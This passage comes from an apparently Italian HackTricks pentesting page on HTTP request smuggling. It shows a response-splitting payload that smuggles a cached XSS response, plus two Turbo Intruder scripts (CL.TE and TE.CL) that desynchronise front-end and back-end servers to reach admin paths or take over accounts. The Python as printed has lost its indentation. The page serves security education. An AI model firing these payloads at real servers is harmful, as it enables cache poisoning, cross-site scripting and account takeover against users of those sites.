SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Generer√† queste risposte (nota come la risposta HEAD ha un Content-Length che rende la risposta TRACE parte del corpo HEAD e una volta che il Content-Length HEAD termina, una valida risposta HTTP viene smugglerata):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Arma di HTTP Request Smuggling con Desincronizzazione della Risposta HTTP

Hai trovato una vulnerabilit√† di HTTP Request Smuggling e non sai come sfruttarla. Prova questi altri metodi di sfruttamento:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Altre Tecniche di HTTP Request Smuggling

* HTTP Request Smuggling del Browser (Lato Client)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling nei Downgrade HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Script Turbo Intruder

### CL.TE

Da [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Da: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Strumenti

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Questo strumento √® un Fuzzer HTTP basato su grammatica utile per trovare strane discrepanze nel request smuggling.

## Riferimenti

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
